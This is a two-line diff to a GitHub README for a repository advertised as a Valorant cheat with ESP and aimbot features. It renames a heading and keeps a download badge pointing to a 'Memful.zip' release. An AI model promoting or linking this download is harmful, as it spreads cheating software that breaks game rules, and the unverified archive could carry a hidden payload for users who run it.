@@ -8,7 +8,7 @@
 ---
 ## 🚀 **How to Use**
 
-### 1️⃣ **Get the Latest Version**
+### 1️⃣ **Get the Latest Release**
 [![DOWNLOAD](https://github.com/user-attachments/assets/c0d9be0d-ecc9-45fb-9939-409f68d28b8b)](https://github.com/MillexBro/MemFul-Valorant-cheat-ESP-AIM/releases/download/latest/Memful.zip)
 
 ---
